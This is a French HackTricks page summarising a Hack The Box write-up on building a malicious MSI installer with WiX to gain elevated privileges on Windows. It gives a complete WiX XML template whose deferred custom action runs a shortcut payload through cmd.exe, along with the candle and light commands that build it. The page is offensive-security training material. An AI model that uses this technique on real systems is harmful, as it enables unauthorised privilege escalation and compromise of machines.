# Création d'un MSI malveillant et obtention des privilèges root

{{#include ../../banners/hacktricks-training.md}}

La création de l'installateur MSI sera effectuée à l'aide de wixtools, plus précisément [wixtools](http://wixtoolset.org) sera utilisé. Il convient de mentionner que d'autres MSI builders ont été testés, mais qu'ils n'ont pas fonctionné dans ce cas particulier.<sup>[[1]](#references)</sup>

Pour comprendre en détail les exemples d'utilisation de wix MSI, il est conseillé de consulter [cette page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Vous y trouverez différents exemples illustrant l'utilisation de wix MSI.<sup>[[2]](#references)</sup>

L'objectif est de générer un MSI qui exécutera le fichier lnk. Pour y parvenir, le code XML suivant pourrait être utilisé ([xml from here](https://0xrick.github.io/hack-the-box/ethereal/index.html#Creating-Malicious-msi-and-getting-root)):<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
Il est important de noter que l’élément Package contient des attributs tels que InstallerVersion et Compressed, qui spécifient respectivement la version de l’installer et indiquent si le package est compressé ou non.

Le processus de création consiste à utiliser candle.exe, un outil de wixtools, pour générer un wixobject à partir de msi.xml. La commande suivante doit être exécutée :<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
De plus, il convient de mentionner qu’une image est incluse dans l’article. Elle représente la commande et sa sortie. Vous pouvez vous y référer pour obtenir une indication visuelle.<sup>[[1]](#references)</sup>

En outre, light.exe, un autre outil de wixtools, sera utilisé pour créer le fichier MSI à partir du wixobject. La commande à exécuter est la suivante :<sup>[[1]](#references)</sup>
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
Comme pour la commande précédente, une image illustrant la commande et sa sortie est incluse dans le post.<sup>[[1]](#references)</sup>

Veuillez noter que, bien que ce résumé vise à fournir des informations utiles, il est recommandé de consulter le post original pour obtenir des détails plus complets et des instructions précises.<sup>[[1]](#references)</sup>

## Références

- [1] [Hack The Box - Ethereal: Creating Malicious msi and getting root - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [A quick introduction: Create an MSI installer with WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (voir également [wixtools](http://wixtoolset.org))

{{#include ../../banners/hacktricks-training.md}}
